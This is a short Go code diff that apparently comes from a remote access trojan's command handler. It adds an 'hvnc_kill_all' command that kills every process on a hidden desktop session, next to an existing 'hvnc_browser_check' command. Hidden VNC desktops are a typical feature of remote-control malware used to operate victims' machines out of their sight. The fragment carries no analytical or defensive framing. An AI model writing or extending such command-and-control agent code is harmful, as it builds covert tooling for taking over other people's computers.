@@ -1493,6 +1493,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		})
 		return nil
 
+	case "hvnc_kill_all":
+		log.Printf("hvnc: kill all processes on hidden desktop")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_kill_all", nil, func() {
+			if err := capture.HVNCKillAll(); err != nil {
+				log.Printf("hvnc: kill all failed: %v", err)
+			}
+		})
+		return nil
+
 	case "hvnc_browser_check":
 		log.Printf("hvnc: browser availability check requested")
 		sendCommandResultSafe(env, cmdID, true, "")
